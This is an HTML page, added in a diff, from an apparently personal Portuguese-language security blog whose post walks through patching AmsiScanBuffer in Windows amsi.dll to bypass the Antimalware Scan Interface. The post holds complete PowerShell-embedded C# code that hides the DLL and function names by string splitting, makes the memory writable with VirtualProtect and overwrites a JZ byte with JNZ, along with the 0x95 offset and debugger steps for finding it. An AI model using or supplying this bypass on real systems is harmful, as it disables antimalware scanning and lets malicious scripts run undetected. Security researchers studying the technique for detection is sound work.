@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" href="../images/50.png" type="image/x-icon">
+  <title>Patch-AMSI</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/github-dark.min.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/languages/cpp.min.js"></script>
+  <script>
+    document.addEventListener('DOMContentLoaded', (event) => {
+      document.querySelectorAll('pre code').forEach((block) => {
+        hljs.highlightElement(block);
+      });
+    });
+  </script>
+  <style>
+    ::-webkit-scrollbar {
+      width: 10px;
+    }
+
+    ::-webkit-scrollbar-track {
+      background: #333;
+    }
+
+    ::-webkit-scrollbar-thumb {
+      background: #555;
+      border-radius: 5px;
+    }
+
+    ::-webkit-scrollbar-thumb:hover {
+      background: #777;
+    }
+
+    html {
+      scrollbar-color: #555 #333;
+      scrollbar-width: thin;
+    }
+  </style>
+  <style>
+    pre {
+      background-color: #1e1e1e;
+      color: #ffffff;
+      padding: 15px;
+      border-radius: 8px;
+      overflow-x: auto;
+      font-family: 'Courier New', monospace;
+      font-size: 14px;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
+    }
+  </style>
+  <link rel="stylesheet" href="../style.css">
+  <link rel="stylesheet" href="../text_style.css">
+  <link rel="stylesheet" href="../dimensao.css">
+  <link rel="stylesheet" href="../background.css">
+  <link rel="stylesheet" href="../head_style.css">
+  <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet">
+</head>
+
+<body>
+  <header style="height: 55px;">
+    <div class="logo">
+      <img src="../images/50.png" height="40" alt="Vith0r logo"
+        style="position: relative; left: none; height: 42px; width: 42px; top: -1px;">
+      <h2>
+        <a href="https://vith0r.github.io"
+          style="color: rgba(255, 255, 255, 0.7); text-decoration: none; position: relative; text-shadow: 3px 3px 5px rgba(139, 92, 246, 0.7); font-family: 'Press Start 2P', sans-serif; font-size: 19px;">
+          &nbsp;VITHOR
+        </a>
+      </h2>
+    </div>
+    <nav>
+      <div class="toggle-container">
+        <a href="../whoami.html">
+          <button class="tutorials-toggle"><i></i>Whoami</button>
+        </a>
+        <a href="../posts.html">
+          <button class="tools-toggle"><i></i>Posts</button>
+        </a>
+        <a href="../projects.html">
+          <button class="tools-toggle"><i></i>Projects</button>
+        </a>
+      </div>
+    </nav>
+  </header>
+  <script>
+    const element = document.querySelector('.logo h2 a');
+    const targetWord = "VITHOR";
+
+    function getRandomString(length) {
+      const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+      let result = '';
+      for (let i = 0; i < length; i++) {
+        result += characters.charAt(Math.floor(Math.random() * characters.length));
+      }
+      return result;
+    }
+
+    function animateRandomization(element, targetWord) {
+      const originalWord = targetWord.split('');
+      let iterations = 0;
+      const maxIterations = 15;
+      let currentWord = getRandomString(targetWord.length).split('');
+      let currentIndex = 0;
+
+      // Mantém a largura e move 10px para a direita
+      element.style.display = 'inline-block';
+      element.style.width = `${element.offsetWidth}px`;
+      element.style.position = 'relative';
+      element.style.left = '5px';
+
+      const interval = setInterval(() => {
+        if (iterations < maxIterations) {
+          currentWord = getRandomString(targetWord.length).split('');
+          iterations++;
+        } else {
+          if (currentIndex < targetWord.length) {
+            currentWord[currentIndex] = originalWord[currentIndex];
+            currentIndex++;
+          } else {
+            clearInterval(interval);
+          }
+        }
+        element.textContent = currentWord.join('');
+      }, 60);
+    }
+
+    setInterval(() => {
+      animateRandomization(element, targetWord);
+    }, 10000);
+
+    element.addEventListener('mouseover', () => {
+      animateRandomization(element, targetWord);
+    });
+
+    animateRandomization(element, targetWord);
+  </script>
+
+  <body>
+    <div class="grain-header"></div>
+    <main>
+      <div class="box">
+        <h1
+          style="color: rgba(255, 255, 255, 0.9); text-decoration: none; position: relative; text-shadow: 3px 3px 5px rgba(60, 122, 255, 0.8);">
+          Patch AMSI</h1>
+        <br>
+        <p>Posted Jul 25, 2024. 5 min read</p>
+        <br>
+        <div class="post-author">
+          <a href="https://github.com/Vith0r" target="_blank">
+            <img src="https://avatars.githubusercontent.com/u/124220594?v=4" alt="Vithor logo">
+            <span>Vithor</span>
+          </a>
+        </div>
+
+        <article>
+          <div style="font-size: 16px;">
+            <p>Bom, neste post estarei mostrando como realizar uma técnica para fazer um patch na <span
+                style="color: #9E2525;">amsi.dll</span> do Windows, essa técnica pode ser realizada no Windows 10 e 11.
+            </p>
+            <br>
+            <div style="padding: 10px; background-color: rgba(60, 122, 255, 0.2); color: white; margin-bottom: 10px;">
+              ⚠️ As informações que você encontrar neste post, técnicas, códigos, provas de conceito ou qualquer outra
+              coisa são estritamente para fins educacionais.
+            </div>
+            <br>
+            <h2 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">O que é a
+              AMSI.DLL</h2>
+            <p><span style="color: #9E2525;">Antimalware Scan Interface</span> é uma biblioteca do Windows que fornece
+              uma interface padrão para permitir que aplicativos e serviços solicitem verificações antimalware em
+              conteúdo carregado.<br>Um exemplo comum de uso da <span style="color: #9E2525;">amsi.dll</span> é na
+              utilização do PowerShell para executar scripts. Quando um script é executado, a AMSI pode escanear o
+              conteúdo do script para detectar e bloquear comandos potencialmente perigosos antes que eles sejam
+              executados.<br>Abaixo, uma imagem para melhor entendimento:</p>
+            <br>
+            <p><img src="https://telegra.ph/file/fd0546b0f37e24f04c80d.png" alt="malicious"
+                style="max-width: 100%; height: 400px; width: 720px; display: block; margin: 20px auto;"></p>
+            <br>
+            <p>Para contornarmos isso, podemos fazer com que o <span style="color: #9E2525;">AMSI</span> execute muitas
+              verificações de validação antes de atingir o código crítico de &quot;verificação&quot; do <span
+                style="color: #9E2525;">AMSI</span>. Podemos debugar a <span style="color: #9E2525;">AMSI.dll</span> no
+              <span style="color: #9E2525;">ida64.exe</span>. Temos apenas que encontrar o ponto crítico.<br>Abaixo, uma
+              imagem para melhor entendimento:
+            </p>
+            <br>
+            <p><img src="https://telegra.ph/file/fc8340db699810552c51b.png" alt="ponto-crítico"
+                style="max-width: 100%; height: 400px; width: 720px; display: block; margin: 20px auto;"></p>
+            <p><img src="https://telegra.ph/file/0366a7876f00425d4d148.png" alt="ponto-crítico"
+                style="max-width: 100%; height: 400px; width: 720px; display: block; margin: 20px auto;"></p>
+            <br>
+            <p>Para isso podemos simplesmente alternar um dos <span style="color: #9E2525;">JZ</span>/<span
+                style="color: #9E2525;">JE</span> para <span style="color: #9E2525;">JNZ</span>/<span
+                style="color: #9E2525;">JNE</span>, para entender melhor saiba que <span
+                style="color: #9E2525;">0x74</span> = <span style="color: #9E2525;">JZ</span>/<span
+                style="color: #9E2525;">JE</span> e <span style="color: #9E2525;">0x75</span> = <span
+                style="color: #9E2525;">JNZ</span>/<span style="color: #9E2525;">JNE</span> o código para realizar o
+              patch esta abaixo:</p>
+            <br>
+            <pre
+              style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;">$data = <span class="hljs-string">@&quot;
+using System;
+using System.Runtime.InteropServices;
+using System.Threading;
+
+public class Program
+{
+	[DllImport(&quot;</span>kernel32<span class="hljs-string">&quot;)]
+	public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+	[DllImport(&quot;</span>kernel32<span class="hljs-string">&quot;)]
+	public static extern IntPtr LoadLibrary(string name);
+	[DllImport(&quot;</span>kernel32<span class="hljs-string">&quot;)]
+	public static extern bool VirtualProtect(IntPtr lpAddress, UInt32 dwSize, uint flNewProtect, out uint lpflOldProtect);
+	public static void Run()
+	{
+		IntPtr lib = LoadLibrary(&quot;</span>a<span class="hljs-string">&quot;+&quot;</span>m<span class="hljs-string">&quot;+&quot;</span>si.<span class="hljs-string">&quot;+&quot;</span>dll<span class="hljs-string">&quot;);
+		IntPtr amsi = GetProcAddress(lib, &quot;</span>Am<span class="hljs-string">&quot;+&quot;</span>s<span class="hljs-string">&quot;+&quot;</span>iScan<span class="hljs-string">&quot;+&quot;</span>B<span class="hljs-string">&quot;+&quot;</span>uffer<span class="hljs-string">&quot;);
+		IntPtr final = IntPtr.Add(amsi, ?);
+		uint old = 0;
+		VirtualProtect(final, (UInt32)0x1, 0x40, out old);
+
+		Console.WriteLine(old);
+		byte[] patch = new byte[] { 0x75 };
+
+		Marshal.Copy(patch, 0, final, 1);
+
+		VirtualProtect(final, (UInt32)0x1, old, out old);
+	}
+}
+&quot;</span>@
+
+Add-Type $data -Language CSharp 
+
+[<span class="hljs-meta">Program</span>]::Run()
+
+</pre>
+            <br>
+            <p>Abaixo está uma explicação mais detalhada para entender o código:</p>
+            <h2 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">Obter o Endereço
+              da Função &quot;AmsiScanBuffer&quot;</h2>
+            <p>Começamos pegando o endereço da função <span style="color: #9E2525;">AmsiScanBuffer</span> carregada na
+              DLL <span style="color: #9E2525;">amsi.dll</span>:</p>
+            <br>
+            <pre
+              style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;">IntPtr lib = LoadLibrary(<span class="hljs-string">&quot;a&quot;</span> + <span class="hljs-string">&quot;m&quot;</span> + <span class="hljs-string">&quot;si.&quot;</span> + <span class="hljs-string">&quot;dll&quot;</span>);
+IntPtr amsi = GetProcAddress(lib, <span class="hljs-string">&quot;Am&quot;</span> + <span class="hljs-string">&quot;s&quot;</span> + <span class="hljs-string">&quot;iScan&quot;</span> + <span class="hljs-string">&quot;B&quot;</span> + <span class="hljs-string">&quot;uffer&quot;</span>);
+</pre>
+            <br>
+            <h3 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">Calcular o
+              Endereço Final</h3>
+            <p>Somamos <span style="color: #9E2525;">?</span> ao endereço de <span
+                style="color: #9E2525;">AmsiScanBuffer</span> para obter o endereço <span
+                style="color: #9E2525;">final</span>, que contém a instrução <span style="color: #9E2525;">JZ/JE</span>:
+            </p>
+            <br>
+            <pre
+              style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;">IntPtr final = IntPtr.Add(amsi, ?);
+</pre>
+            <br>
+            <h3 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">Alterar a
+              Permissão de Memória</h3>
+            <p>Alteramos a permissão de memória do endereço final para permitir escrita, então saiba que <span
+                style="color: #9E2525;">0x40</span> é <span style="color: #9E2525;">PAGE_EXECUTE_READWRITE</span>. e
+              então exibimos a permissão de memória anterior:</p>
+            <br>
+            <pre
+              style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;"><span class="hljs-built_in">uint</span> old = <span class="hljs-number">0</span>;
+VirtualProtect(final, (UInt32)<span class="hljs-number">0x1</span>, <span class="hljs-number">0x40</span>, <span class="hljs-keyword">out</span> old);
+Console.WriteLine(old);
+</pre>
+            <br>
+            <h3 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">Aplicar o Patch
+            </h3>
+            <p>Mudamos os primeiros bytes do endereço final para <span style="color: #9E2525;">0x75</span>, que altera a
+              instrução para <span style="color: #9E2525;">JNZ</span>/<span style="color: #9E2525;">JNE</span>:</p>
+            <br>
+            <pre
+              style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;"><span class="hljs-built_in">byte</span>[] patch = <span class="hljs-keyword">new</span> <span class="hljs-built_in">byte</span>[] { <span class="hljs-number">0x75</span> };
+Marshal.Copy(patch, <span class="hljs-number">0</span>, final, patch.Length);
+</pre>
+            <br>
+            <h2 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">Primeiro passo:
+            </h2><br>
+            <p><img src="https://telegra.ph/file/91d6fdc54ae0031f315c1.gif" alt="1"
+                style="max-width: 100%; height: 400px; width: 720px; display: block; margin: 20px auto;"></p>
+            <br>
+            <h3 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">Segundo passo:
+            </h3>
+            <p>Aqui apenas definimos um BreakPoint para acharmos o endereço do <span
+                style="color: #9E2525;">AmsiScanBuffer</span>.<br> depois pressionamos <span
+                style="color: #9E2525;">ctrl
+                + b</span> colamos o hex que copiamos para então encontrar o endereço do <span
+                style="color: #9E2525;">JZ</span>/<span style="color: #9E2525;">JE</span> que precisamos copiar:</p>
+            <br>
+            <p><img src="https://telegra.ph/file/d15b4032834ce00374c9b.gif" alt="2"
+                style="max-width: 100%; height: 400px; width: 720px; display: block; margin: 20px auto;"></p>
+            <br>
+            <h3 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">Terceiro passo:
+            </h3>
+            <p>Aqui fazemos um calculo simples <span style="color: #9E2525;">Endereço do "AmsiScanBuffer"</span> + <span
+                style="color: #9E2525;">Endereço do "JZ/JE"</span> que queremos modificar para <span
+                style="color: #9E2525;">JNZ</span>/<span style="color: #9E2525;">JNE</span>:</p>
+            <br>
+            <p><img src="https://telegra.ph/file/536b460067ccd8f58d941.gif" alt="3"
+                style="max-width: 100%; height: 470px; width: 720px; display: block; margin: 20px auto;"></p>
+            <br>
+            <h3 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">Quarto passo:
+            </h3>
+            <p>Agora que sabemos quanto temos que adicionar <span style="color: #9E2525;">0x95</span> ao endereço do
+              <span style="color: #9E2525;">AmsiScanBuffer</span> para chegar no endereço final <span
+                style="color: #9E2525;">JZ/JE</span>, apenas o adicionamos no código:
+            </p>
+            <br>
+            <pre
+              style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;">IntPtr final = IntPtr.Add(amsi, <span class="hljs-number">0x95</span>);
+</pre>
+            <br>
+            <h3 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">Entendendo o
+              processo:</h3>
+            <p>Agora que terminamos de achar tudo que precisávamos, vamos executar o código no próprio PowerShell. ao
+              executar nosso código, ele fará o seguinte: obterá o endereço de <span
+                style="color: #9E2525;">AmsiScanBuffer</span>, adicionará <span style="color: #9E2525;">0x95</span> ao
+              endereço para chegar ao endereço final <span style="color: #9E2525;">JZ/JE</span>, alterará as permissões
+              para <span style="color: #9E2525;">0x40</span>, que corresponde a <span
+                style="color: #9E2525;">PAGE_EXECUTE_READWRITE</span>, mudará o byte de <span
+                style="color: #9E2525;">0x74</span> para <span style="color: #9E2525;">0x75</span>, que altera o <span
+                style="color: #9E2525;">JZ/JE</span> para <span style="color: #9E2525;">JNZ/JNE</span>, e restaurará as
+              permissões de memória originais para garantir que nosso patch seja realizado com sucesso.</p>
+            <h2 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">Realizando o
+              patch:</h2><br>
+            <p><img src="https://telegra.ph/file/5100d6f4aeafe8a89a9c6.gif" alt="patch"
+                style="max-width: 100%; height: 400px; width: 720px; display: block; margin: 20px auto;"></p>
+          </div>
+        </article>
+      </div>
+    </main>
+    <footer style="background-color: rgba(27, 27, 27, 0.7); text-align: center; padding: 5px 0;">
+      <h6 style="color: rgba(255, 255, 255, 0.4) !important;">Copyright © Vithor 2023/2024</h6>
+    </footer>
+    <script>
+      // Função para detectar se é um dispositivo móvel
+      function isMobileDevice() {
+        return /Mobi|Android|iPhone|iPad|iPod|BlackBerry|Windows Phone/i.test(navigator.userAgent);
+      }
+
+      // Se for um dispositivo móvel, exibe uma mensagem e redireciona
+      if (isMobileDevice()) {
+        alert("Este site não é compatível com dispositivos móveis. Você será redirecionado para o Google.");
+        window.location.href = "https://www.google.com"; // Redireciona para o Google
+      }
+    </script>
+  </body>
+
+</html>
